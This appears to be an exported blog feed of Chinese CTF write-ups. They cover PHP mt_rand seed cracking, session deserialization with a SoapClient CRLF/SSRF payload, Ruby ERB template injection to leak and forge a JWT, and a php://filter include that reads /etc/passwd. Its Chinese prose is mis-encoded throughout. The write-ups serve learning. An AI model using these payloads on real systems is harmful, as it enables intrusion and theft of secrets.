class="hljs-string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>.$row[<span class="hljs-string">&quot;flag&quot;</span>].<span class="hljs-string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>;        &#125;    &#125;    &#125;&#125; <span class="hljs-comment">// genarate public_key </span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">public_key</span>(<span class="hljs-params">$length = <span class="hljs-number">16</span></span>) </span>&#123;    $strings1 = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;    $public_key = <span class="hljs-string">&#x27;&#x27;</span>;    <span class="hljs-keyword">for</span> ( $i = <span class="hljs-number">0</span>; $i &lt; $length; $i++ )    $public_key .= substr($strings1, mt_rand(<span class="hljs-number">0</span>, strlen($strings1) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);    <span class="hljs-keyword">return</span> $public_key;  &#125;  <span class="hljs-comment">//genarate private_key</span>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">private_key</span>(<span class="hljs-params">$length = <span class="hljs-number">12</span></span>) </span>&#123;    $strings2 = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;    $private_key = <span class="hljs-string">&#x27;&#x27;</span>;    <span class="hljs-keyword">for</span> ( $i = <span class="hljs-number">0</span>; $i &lt; $length; $i++ )    $private_key .= substr($strings2, mt_rand(<span class="hljs-number">0</span>, strlen($strings2) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);    <span class="hljs-keyword">return</span> $private_key;  &#125;  $Public_key = public_key();  <span class="hljs-comment">//$Public_key = KVQP0LdJKRaV3n9D  how to get crispr&#x27;s private_key???</span></code></pre></code></pre><p>é¦–å…ˆè¦è·å–åˆ°<code>private_key</code>    </p><p>ä¹‹å‰ä¹Ÿåšè¿‡ä¸€é“<code>mt_rand</code>çš„é¢˜ç›®ï¼Œé‚£ä¸€é“æ˜¯æ ¹æ®å‰å‡ ä½å¾—åˆ°<code>seed</code>      </p><p>è¿™æ¬¡ç”¨<code>public_key</code>å¾—åˆ°<code>seed</code>è¿™ä¸¤ä¸ªåº”è¯¥æ˜¯åŒä¸€ä¸ª<code>seed</code>å§   </p><p>ä¸è¿‡è¿™æ¬¡ç”¨ä¹‹å‰çš„è„šæœ¬è½¬æ¢æ—¶çˆ†ä¸å‡ºæ¥     </p><p>æ‰¾äº†ä¸€ä¸ªæ–°çš„è„šæœ¬     </p><p>å‘ç°å°‘äº†ä¸€ä½ï¼Œæˆ‘ä¹‹å‰é‚£é“é¢˜æ˜¯æ€ä¹ˆåšå‡ºæ¥çš„ï¼ï¼ï¼ï¼Ÿï¼Ÿï¼Ÿ   </p><p>PHPç‰ˆï¼š     </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$pass=<span class="hljs-string">&#x27;KVQP0LdJKRaV3n9D&#x27;</span>;$str=<span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;$result=<span class="hljs-string">&#x27;&#x27;</span>;$len1=strlen($pass);$len2=strlen($str)<span class="hljs-number">-1</span>;<span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;$len1;$i++)&#123;    <span class="hljs-keyword">for</span>($j=<span class="hljs-number">0</span>;$j&lt;$len2+<span class="hljs-number">1</span>;$j++)    &#123;        <span class="hljs-keyword">if</span>($pass[$i]===$str[$j])        &#123;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$j</span> <span class="hljs-subst">$j</span> 0 <span class="hljs-subst">$len2</span> &quot;</span>;            <span class="hljs-keyword">break</span>;        &#125;    &#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p>pythonç‰ˆï¼š    </p><pre><code><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span>s = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>key = <span class="hljs-string">&#x27;KVQP0LdJKRaV3n9D&#x27;</span>m = <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> key:    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(s)):        <span class="hljs-keyword">if</span> i == s[j]:            m += <span class="hljs-string">&quot;&#123;&#125; &#123;&#125; 0 &#123;&#125; &quot;</span>.<span class="hljs-built_in">format</span>(j,j,<span class="hljs-built_in">len</span>(s)<span class="hljs-number">-1</span>)print(m)</code></pre></code></pre><p>è½¬æ¢åçš„ç»“æœï¼š      </p><pre><code>36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61      </code></pre><p><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/bd326a1b-2d71-4537-b51c-fdfe509f1aaa.png" alt="02.png">      </p><p>æ³¨æ„è¿™é‡Œçš„PHPç‰ˆæœ¬ä¸º<code>5.2.1 to 7.0.x</code>å¦‚æœç‰ˆæœ¬ä¸å¯¹çš„è¯ï¼Œç”Ÿæˆçš„ä¹Ÿä¸ä¸€æ ·ã€‚</p><p>é‡æ–°ç”Ÿæˆ<code>private_key</code>        </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>mt_srand(<span class="hljs-number">1775196155</span>);<span class="hljs-comment">// genarate public_key </span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">public_key</span>(<span class="hljs-params">$length = <span class="hljs-number">16</span></span>)</span><span class="hljs-function"></span>&#123;    $strings1 = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;    $public_key = <span class="hljs-string">&#x27;&#x27;</span>;    <span class="hljs-keyword">for</span> ($i = <span class="hljs-number">0</span>; $i &lt; $length; $i++)        $public_key .= substr($strings1, mt_rand(<span class="hljs-number">0</span>, strlen($strings1) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);    <span class="hljs-keyword">return</span> $public_key;&#125;<span class="hljs-comment">//genarate private_key</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">private_key</span>(<span class="hljs-params">$length = <span class="hljs-number">12</span></span>)</span><span class="hljs-function"></span>&#123;    $strings2 = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;    $private_key = <span class="hljs-string">&#x27;&#x27;</span>;    <span class="hljs-keyword">for</span> ($i = <span class="hljs-number">0</span>; $i &lt; $length; $i++)        $private_key .= substr($strings2, mt_rand(<span class="hljs-number">0</span>, strlen($strings2) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);    <span class="hljs-keyword">return</span> $private_key;&#125;<span class="hljs-keyword">echo</span> public_key().<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<span class="hljs-keyword">echo</span> private_key();</code></pre></code></pre><p>å¾—åˆ°ï¼š     </p><pre><code>KVQP0LdJKRaV3n9DXuNhoueCDCGc   </code></pre><p>sqlä¸‡èƒ½å…¬å¼å¾—åˆ°flagï¼š     </p><p><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/654d7ca9-db67-400a-b992-0afefb8809be.png" alt="03.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>php</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>php</tag>
      
      <tag>mt_srand</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Bestphp&#39;s Revenge</title>
    <link href="/2021/05/06/BUU83/"/>
    <url>/2021/05/06/BUU83/</url>
    
    <content type="html"><![CDATA[<h2 id="Knowledge"><a href="#Knowledge" class="headerlink" title="Knowledge"></a>Knowledge</h2><ul><li>PHPä¸­SESSIONååºåˆ—åŒ–   <ul><li>PHPä¸­çš„sessionä¸­çš„å†…å®¹æ˜¯ä»¥æ–‡ä»¶çš„æ–¹å¼å­˜å‚¨çš„ï¼Œå¹¶ä¸æ˜¯å­˜äºå†…å­˜ä¸­ï¼Œå­˜å‚¨æ–¹å¼ç”±é…ç½®é¡¹<code>session.save_handler</code>æ§åˆ¶ï¼Œé»˜è®¤æ–‡ä»¶ã€‚</li><li>æ–‡ä»¶ä»¥sess_sessionidè¿›è¡Œå‘½åï¼Œæ–‡ä»¶çš„å†…å®¹æ˜¯sessionå€¼åºåˆ—åŒ–åçš„å†…å®¹</li><li>åœ¨<code>php.ini</code>ä¸­å­˜åœ¨ä¸‰é¡¹é…ç½®ï¼š</li><li><code>session.save_path=&quot;&quot;</code>   â€“è®¾ç½®sessionçš„å­˜å‚¨è·¯å¾„     </li><li><code>session.save_handler=&quot;&quot; </code>â€“è®¾å®šç”¨æˆ·è‡ªå®šä¹‰å­˜å‚¨å‡½æ•°ï¼Œå¦‚æœæƒ³ä½¿ç”¨PHPå†…ç½®ä¼šè¯å­˜å‚¨æœºåˆ¶ä¹‹å¤–çš„å¯ä»¥ä½¿ç”¨æœ¬å‡½æ•°(æ•°æ®åº“ç­‰æ–¹å¼)       </li><li><code>session.serialize_handler   string</code> â€“å®šä¹‰ç”¨æ¥åºåˆ—åŒ–/ååºåˆ—åŒ–çš„å¤„ç†å™¨åå­—ã€‚é»˜è®¤æ˜¯php(5.5.4åæ”¹ä¸ºphp_serialize)    </li><li><code>session.serialize_handler</code>å­˜åœ¨ä¸‰ç§æ¨¡å¼   </li><li><code>php_binary</code>â€”&gt;é”®åçš„é•¿åº¦å¯¹åº”çš„asciiå­—ç¬¦+é”®å+ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–åçš„å€¼</li><li><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/e340b98b-eff6-43b5-b50a-ab8ee414d4f3.png" alt="03.png">        </li><li><code>php</code>â€”-&gt;é”®å+ç«–çº¿ï¼ˆ|ï¼‰+ç»è¿‡serialize()å‡½æ•°å¤„ç†è¿‡çš„å€¼</li><li><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/011a6f2d-5c94-46fc-ba17-8758eeb94a48.png" alt="04.png">       </li><li><code>php_serialize</code>â€”-&gt;ç»è¿‡serialize()å‡½æ•°å¤„ç†è¿‡çš„å€¼ï¼Œä¼šå°†é”®åå’Œå€¼å½“ä½œä¸€ä¸ªæ•°ç»„åºåˆ—åŒ–   </li><li><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/d4410c44-8d12-4db3-a1cc-8502eeb791d0.png" alt="05.png">   </li><li>å¦‚æœèƒ½å¤Ÿæ”¹å˜åºåˆ—åŒ–çš„æ¨¡å¼ï¼Œæ¯”å¦‚é»˜è®¤æ˜¯PHPï¼Œå°†å…¶æ”¹ä¸º<code>php_serialize</code>ï¼Œå‡ºå…¥åºåˆ—åŒ–å‰é¢åŠ ä¸Š<code>|</code>ï¼Œè¿™æ ·ååºåˆ—åŒ–æ—¶ï¼ŒæŒ‰é»˜è®¤çš„<code>php</code>æ—¶ï¼Œä¼ å…¥çš„åºåˆ—åŒ–å°±è¢«ååºåˆ—åŒ–äº†      </li></ul></li></ul><ul><li><p>PHPåŸç”Ÿç±»<code>SoapClient</code>ï¼Œå½“å…¶ä¸­çš„<code>__call</code>æ–¹æ³•è§¦å‘æ—¶å¯ä»¥å‘é€HTTPå’ŒHTTPsè¯·æ±‚</p><ul><li><code>public SoapClient :: SoapClient ï¼ˆmixed $wsdl [ï¼Œarray $options ]ï¼‰</code>      </li><li>ç¬¬ä¸€ä¸ªå‚æ•°æŒ‡æ˜æ˜¯å¦ä¸º<code>wsdlæ¨¡å¼</code>     </li><li>ç¬¬äºŒä¸ªå‚æ•°ä¸ºä¸€ä¸ªæ•°ç»„ï¼Œå¦‚æœåœ¨wsdlæ¨¡å¼ä¸‹ï¼Œæ­¤å‚æ•°å¯é€‰ï¼›å¦‚æœåœ¨éwsdlæ¨¡å¼ä¸‹ï¼Œåˆ™å¿…é¡»è®¾ç½®locationå’Œurié€‰é¡¹ï¼Œå…¶ä¸­locationæ˜¯è¦å°†è¯·æ±‚å‘é€åˆ°çš„SOAPæœåŠ¡å™¨çš„URLï¼Œè€Œuri æ˜¯SOAPæœåŠ¡çš„ç›®æ ‡å‘½åç©ºé—´ã€‚   </li><li><a href="https://www.anquanke.com/post/id/153065#h2-1">soap</a>    </li></ul></li><li><p><a href="https://www.jianshu.com/p/d4c304dbd0af"><code>CRLF Injection</code></a>       </p><ul><li>ç®€å•è¯´å°±æ˜¯åœ¨è¯·æ±‚å¤´ä¸­æ³¨å…¥<code>\r\n</code>,ä»è€Œç”Ÿæˆæ–°çš„è¯·æ±‚å¤´ï¼Œæˆ–è€…è¦†ç›–åŸæ¥çš„è¯·æ±‚å¤´ï¼Œæˆ–è€…æ³¨å…¥<code>\r\n\r\n</code>,æ³¨å…¥è¯·æ±‚ï¼ˆå¤´å’Œä½“ç”±ä¸¤ä¸ª<code>\r\n</code>åˆ†å‰²ï¼‰     </li></ul></li></ul><h2 id="Try-To-Solve"><a href="#Try-To-Solve" class="headerlink" title="Try To Solve"></a>Try To Solve</h2><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>highlight_file(<span class="hljs-keyword">__FILE__</span>);$b = <span class="hljs-string">&#x27;implode&#x27;</span>;call_user_func($_GET[<span class="hljs-string">&#x27;f&#x27;</span>], $_POST);session_start();<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;name&#x27;</span>])) &#123;    $_SESSION[<span class="hljs-string">&#x27;name&#x27;</span>] = $_GET[<span class="hljs-string">&#x27;name&#x27;</span>];&#125;var_dump($_SESSION);$a = <span class="hljs-keyword">array</span>(reset($_SESSION), <span class="hljs-string">&#x27;welcome_to_the_lctf2018&#x27;</span>);call_user_func($b, $a);<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p>ä¸€å¼€å§‹ï¼Œç›´æ¥ä¸€ä¸ª<code>$_POST</code>æ²¡ååº”è¿‡æ¥<br><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/6b2ec884-06ae-4190-b0fd-89028778c220.png" alt="02.png"></p><p>å‘ç°<code>flag.php</code>      </p><pre><code><pre><code class="hljs php">only localhost can get flag!session_start();<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;only localhost can get flag!&#x27;</span>;$flag = <span class="hljs-string">&#x27;LCTF&#123;*************************&#125;&#x27;</span>;<span class="hljs-keyword">if</span>($_SERVER[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]===<span class="hljs-string">&quot;127.0.0.1&quot;</span>)&#123;       $_SESSION[<span class="hljs-string">&#x27;flag&#x27;</span>] = $flag;   &#125;only localhost can get flag!</code></pre></code></pre><p>è§£é¢˜æ€è·¯ï¼šé¦–å…ˆå¯ä»¥é€šè¿‡ç¬¬ä¸€ä¸ª<code>call_user_func</code>è¦†ç›–<code>serialize_handler</code>ä¸º<code>php_serialize</code>ï¼Œåœ¨nameä¸­å†™å…¥åˆ©ç”¨<code>soapClient</code>äº§ç”Ÿçš„åºåˆ—åŒ–ï¼›ç¬¬äºŒæ¬¡é€šè¿‡<code>extract</code>è¦†ç›–å˜é‡<code>b</code>ä¸º<code>call_user_func</code>ï¼Œnameä¸º<code>SoapClient</code>ï¼Œå½“<code>call_user_func</code>çš„å‚æ•°ä¸ºä¸€ä¸ªæ•°ç»„æ—¶ï¼Œä¼šæŠŠé”®åå½“ä½œä¸€ä¸ªç±»åï¼Œå€¼å½“ä½œæ–¹æ³•ï¼›</p><p><code>call_user_func($b, $a);</code>â€”â€”&gt;<code>call_user_func(call_user_func(array(SoapClient,&#39;welcome_to_the_lctf2018&#39;)))</code>â€”â€”&gt;<code>SoapClient-&gt;welcome_to_the_lctf2018()</code>â€”â€“&gt;æ²¡æœ‰è¿™ä¸ªæ–¹æ³•ï¼Œä»è€Œè°ƒç”¨<code>__call</code>       </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$target = <span class="hljs-string">&quot;http://127.0.0.1/flag.php&quot;</span>;$attack = <span class="hljs-keyword">new</span> SoapClient(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;location&#x27;</span> =&gt; $target,    <span class="hljs-string">&#x27;user_agent&#x27;</span> =&gt; <span class="hljs-string">&quot;N0rth3ty\r\nCookie: PHPSESSID=g6ooseaeo905j0q4b9qqn2n471\r\n&quot;</span>,    <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; <span class="hljs-string">&quot;123&quot;</span>));$payload = urlencode(serialize($attack));<span class="hljs-keyword">echo</span> $payload;<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p>ç¬¬ä¸€æ¬¡ä½¿ç”¨SoapClientç±»ä¼šæŠ¥é”™ï¼Œéœ€è¦åœ¨<code>php.ini</code>ä¸­æ‰“å¼€<br><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/3910e692-bdd4-40f7-b076-82fa36305fac.png" alt="01.png"></p><p>ä¼ å…¥ </p><pre><code>f=session_start&amp;name=[ç”Ÿæˆçš„payload]         POST: serializer_handler=php_serialize</code></pre><p>ç„¶åä¼ </p><pre><code>f=extract&amp;name=SoapClienPOST:b=call_user_func   </code></pre><p>æ¥è§¦å‘ç±»    </p><p>ä½†æˆ‘è¿™é‡Œæ²¡æˆåŠŸï¼Œè¯•äº†å¥½å‡ ä¸ªå¸ˆå‚…çš„éƒ½ä¸è¡Œ        </p><p>ç®—äº†    </p><p>å°±å½“ç§¯ç´¯çŸ¥è¯†ç‚¹å§</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>php</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>php</tag>
      
      <tag>serialize</tag>
      
      <tag>åŸç”Ÿç±»</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Flag Shop</title>
    <link href="/2021/05/04/BUU82/"/>
    <url>/2021/05/04/BUU82/</url>
    
    <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title="|_|-|"></a>|_|-|</h2><p>æ‰“å¼€ç¯å¢ƒ</p><p><img src="https://img13.360buyimg.com/ddimg/jfs/t1/172950/8/7918/21544/60915946Edcb47200/b52ca327067e551d.png" alt="01.png"></p><p>ç‚¹ä¸€ä¸‹<code>buy flag</code>     </p><p>å¼¹å‡ºäº†<code>&#123;&quot;title&quot;:&quot;error&quot;,&quot;message&quot;:&quot;no enough jkl&quot;&#125;</code>     </p><p>æƒ³åˆ°äº†åº”è¯¥æ˜¯è¦ä¼ªé€ cookie     </p><p>é¡ºä¾¿çœ‹çœ‹<code>robots.txt</code>ï¼Œå±…ç„¶æœ‰    </p><pre><code>User-agent: *Disallow: /filebak     </code></pre><p><code>/filebak</code>     </p><pre><code>```rubyrequire &#39;sinatra&#39;require &#39;sinatra/cookies&#39;require &#39;sinatra/json&#39;require &#39;jwt&#39;require &#39;securerandom&#39;require &#39;erb&#39;set :public_folder, File.dirname(__FILE__) + &#39;/static&#39;FLAGPRICE = 1000000000000000000000000000ENV[&quot;SECRET&quot;] = SecureRandom.hex(64)configure do  enable :logging  file = File.new(File.dirname(__FILE__) + &#39;/../log/http.log&#39;,&quot;a+&quot;)  file.sync = true  use Rack::CommonLogger, fileendget &quot;/&quot; do  redirect &#39;/shop&#39;, 302endget &quot;/filebak&quot; do  content_type :text  erb IO.binread __FILE__endget &quot;/api/auth&quot; do  payload = &#123; uid: SecureRandom.uuid , jkl: 20&#125;  auth = JWT.encode payload,ENV[&quot;SECRET&quot;] , &#39;HS256&#39;  cookies[:auth] = authendget &quot;/api/info&quot; do  islogin  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#39;HS256&#39; &#125;  json(&#123;uid: auth[0][&quot;uid&quot;],jkl: auth[0][&quot;jkl&quot;]&#125;)endget &quot;/shop&quot; do  erb :shopendget &quot;/work&quot; do  islogin  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#39;HS256&#39; &#125;  auth = auth[0]  unless params[:SECRET].nil?    if ENV[&quot;SECRET&quot;].match(&quot;#&#123;params[:SECRET].match(/[0-9a-z]+/)&#125;&quot;)      puts ENV[&quot;FLAG&quot;]    end  end  if params[:do] == &quot;#&#123;params[:name][0,7]&#125; is working&quot; then    auth[&quot;jkl&quot;] = auth[&quot;jkl&quot;].to_i + SecureRandom.random_number(10)    auth = JWT.encode auth,ENV[&quot;SECRET&quot;] , &#39;HS256&#39;    cookies[:auth] = auth    ERB::new(&quot;&lt;script&gt;alert(&#39;#&#123;params[:name][0,7]&#125; working successfully!&#39;)&lt;/script&gt;&quot;).result  endendpost &quot;/shop&quot; do  islogin  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#39;HS256&#39; &#125;  if auth[0][&quot;jkl&quot;] &lt; FLAGPRICE then    json(&#123;title: &quot;error&quot;,message: &quot;no enough jkl&quot;&#125;)  else    auth &lt;&lt; &#123;flag: ENV[&quot;FLAG&quot;]&#125;    auth = JWT.encode auth,ENV[&quot;SECRET&quot;] , &#39;HS256&#39;    cookies[:auth] = auth    json(&#123;title: &quot;success&quot;,message: &quot;jkl is good thing&quot;&#125;)  endenddef islogin  if cookies[:auth].nil? then    redirect to(&#39;/shop&#39;)  endend```   </code></pre><p>è™½ç„¶çœ‹ä¸æ‡‚æ˜¯å•¥ï¼Œä½†çœ‹åˆ°äº†jwt     </p><p>cookieåº”è¯¥å°±æ˜¯jwtäº†å§     </p><p>è§£ç ä¸€ä¸‹     </p><p><img src="https://img11.360buyimg.com/ddimg/jfs/t1/181071/5/2256/71195/60915948Eaa5fb2dd/e6380093c94ee610.png" alt="02.png">   </p><p>ç¡®å®ï¼Œè¯•ç€ç”¨<code>jwtcrack</code>çˆ†ç ´ä¸€ä¸‹secret      </p><p>çˆ†äº†ä¸€ä¼šï¼Œæ„Ÿè§‰çˆ†ä¸å‡ºæ¥    </p><p>éš¾é“ä¸æ˜¯è¿™ä¸ªè€ƒç‚¹    </p><p>å›å»çœ‹é‚£ä¸ªæºç     </p><p>çœ‹ä¸æ‡‚     </p><p>è¿˜æ˜¯å»çœ‹WPå§   </p><hr><p>rubyçš„ERBæ¨¡æ¿æ³¨å…¥     </p><p>ä¸»è¦çš„ä»£ç     </p><pre><code>```rubyget &quot;/work&quot; do  islogin  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#39;HS256&#39; &#125;  auth = auth[0]  unless params[:SECRET].nil?    if ENV[&quot;SECRET&quot;].match(&quot;#&#123;params[:SECRET].match(/[0-9a-z]+/)&#125;&quot;)      puts ENV[&quot;FLAG&quot;]    end  end  if params[:do] == &quot;#&#123;params[:name][0,7]&#125; is working&quot; then    auth[&quot;jkl&quot;] = auth[&quot;jkl&quot;].to_i + SecureRandom.random_number(10)    auth = JWT.encode auth,ENV[&quot;SECRET&quot;] , &#39;HS256&#39;    cookies[:auth] = auth    ERB::new(&quot;&lt;script&gt;alert(&#39;#&#123;params[:name][0,7]&#125; working successfully!&#39;)&lt;/script&gt;&quot;).result  endend```      </code></pre><p>å‚æ•°<code>SECRET</code>ä¸çœŸçš„<code>SECRET</code>åŒ¹é…ï¼ŒæˆåŠŸåˆ™è¿”å›flag    </p><p>å‚æ•°<code>do</code>ä¸<code>name</code>ï¼Œå¦‚æœdoçš„å€¼ä¸nameçš„å‰ä¸ƒä½åŠ ä¸Š<code> is working</code>ä¸€æ ·ï¼Œä¼šå¼¹å‡º<code>&lt;script&gt;alert(&#39;#&#123;params[:name][0,7]&#125; working successfully!&#39;)&lt;/script&gt;</code><br>è¿™é‡Œå­˜åœ¨æ¨¡æ¿æ³¨å…¥</p><p>REBæ¨¡æ¿æ³¨å…¥çš„æ ¼å¼<code>&lt;%=7*7%&gt;</code>â€”â€”-&gt;49      </p><p>ç„¶åæ˜¯rubyä¸­çš„<a href="https://docs.ruby-lang.org/en/2.4.0/globals_rdoc.html">é¢„å®šä¹‰å˜é‡</a>â€“&gt;<code>$&#39;</code>è¿”å›æœ€åä¸€æ¬¡æˆåŠŸåŒ¹é…å³è¾¹çš„å­—ç¬¦ä¸²      </p><p>æœ€åä¸€æ¬¡æˆåŠŸåŒ¹é…ï¼Ÿï¼Ÿï¼Ÿä¸Šé¢é‚£ä¸ªï¼Ÿï¼Ÿ</p><p>æ„é€ <code>&lt;%=$&#39;%&gt;</code>æ­£å¥½ä¸ƒä½     </p><p>è¿˜è¦hexç¼–ç ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚       </p><p>payloadï¼š<code>/work?SECRET=&amp;name=%3C%25%3D%24%27%25%3E&amp;do=%3C%25%3D%24%27%25%3E%20is%20working</code>     </p><p><img src="https://img14.360buyimg.com/ddimg/jfs/t1/171834/33/7788/70013/60915948Eff3e1215/1de2e42b943ae0db.png" alt="03.png">   </p><p>è¿”å›çš„å°±æ˜¯SECRET   </p><p>æ„é€ æ–°çš„jwt    </p><p><img src="https://img13.360buyimg.com/ddimg/jfs/t1/194760/8/1229/73202/60915947E03771f73/f2ef6f29d8c4d0dc.png" alt="04.png"> </p><p>å†™å…¥cookie     </p><p>flagåœ¨è¿”å›å¤´çš„cookieé‡Œ    </p><p><img src="https://img11.360buyimg.com/ddimg/jfs/t1/180216/2/2292/80981/60915947E137ed448/8c24414f41a9b8de.png" alt="05.png">     </p><p><a href="https://www.anquanke.com/post/id/86867">REB SSTI</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>jwt</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>jwt</tag>
      
      <tag>ruby</tag>
      
      <tag>ERB</tag>
      
      <tag>SSTI</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Ezinclude</title>
    <link href="/2021/05/01/BUU81/"/>
    <url>/2021/05/01/BUU81/</url>
    
    <content type="html"><![CDATA[<h2 id="ã€-ã€‘"><a href="#ã€-ã€‘" class="headerlink" title="ã€-+-    -+-ã€‘"></a><code>ã€-+-    -+-ã€‘</code></h2><p>è¿›å…¥ç¯å¢ƒ<br><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/ec2beb98-e0a5-42f4-82d7-a399394609fe.png" alt="01.png">      </p><p>æ³¨é‡Šä¸­æœ‰Hint      </p><p><code>&lt;!--md5($secret.$name)===$pass --&gt;</code>        </p><p>åº”è¯¥æ˜¯è¦ä¼ å…¥nameå’Œpass       </p><p>å“åº”å¤´é‡Œæœ‰ä¸€æ®µhashå€¼       </p><p>å½“æˆpassä¼ å…¥ï¼Œnameä¸ä¼      </p><p><code>?pass=fa25e54758d5d5c1927781a6ede89f8a</code>      </p><p>æœ‰è·³è½¬ï¼ŒæŠ“åŒ…     </p><p><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/1454b3cd-95be-480e-a3e5-4f6e0ce65151.png" alt="02.png">       </p><p>çœ‹ä¸€ä¸‹<code>flflflflag.php</code>     </p><p><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/2e856e0a-e4e7-42c6-a5cd-3de410a8da3f.png" alt="03.png"></p><p>æœ‰includeï¼Œä¼ªåè®®è¯»ä¸€ä¸‹æºç       </p><p><code>?file=php://filter/read=convert.base64.encode/resource=flflflflag.php</code>       </p><p><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/636b976a-82d7-40c9-b96b-5cb660f19217.png" alt="04.png">     </p><p>è§£ç å       </p><pre><code><pre><code class="hljs php">&lt;html&gt;&lt;head&gt;&lt;script language=<span class="hljs-string">&quot;javascript&quot;</span> type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;           window.location.href=<span class="hljs-string">&quot;404.html&quot;</span>;&lt;/script&gt;&lt;title&gt;this_is_not_fl4g_and_å‡ºé¢˜äºº_wants_girlfriend&lt;/title&gt;&lt;/head&gt;&lt;&gt;&lt;body&gt;<span class="hljs-meta">&lt;?php</span>$file=$_GET[<span class="hljs-string">&#x27;file&#x27;</span>];<span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/data|input|zip/is&#x27;</span>,$file))&#123;<span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;nonono&#x27;</span>);&#125;@<span class="hljs-keyword">include</span>($file);<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;include($_GET[&quot;file&quot;])&#x27;</span>;<span class="hljs-meta">?&gt;</span>&lt;/body&gt;&lt;/html&gt;</code></pre></code></pre><p>æ„Ÿè§‰ä¹Ÿæ²¡å•¥å•Š       </p><p>æ¥ä¸‹æ¥åˆ©ç”¨<code>php://filter/string.strip_tags</code>       </p><p>php7.0çš„BUG</p><p>payload:<code>?file=php://filter/string.strip_tags/resource=/etc/passwd</code>       